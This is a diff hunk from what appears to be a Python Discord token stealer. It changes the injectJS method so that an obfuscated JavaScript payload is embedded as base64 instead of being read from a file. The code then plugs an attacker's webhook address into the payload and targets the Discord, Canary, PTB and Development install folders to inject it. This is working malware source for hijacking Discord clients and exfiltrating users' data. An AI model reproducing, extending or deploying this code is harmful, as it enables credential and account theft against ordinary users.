@@ -517,10 +517,10 @@ class Discord:
     @staticmethod
     def injectJS():
         check = False
-        if not os.path.isfile(injectionScript := os.path.join(MEIPASS, 'injection-obfuscated.js')) or not INJECT_JS:
-            return
-        with open(injectionScript, encoding= 'utf-8') as file:
-            code = file.read().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(WEBHOOK.encode()).decode()))
+        try:
+            code = base64.b64decode(b"%injectionbase64encoded%").decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(WEBHOOK.encode()).decode()))
+        except Exception:
+            return None
         
         for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
             path = os.path.join(os.getenv('localappdata'), dirname)
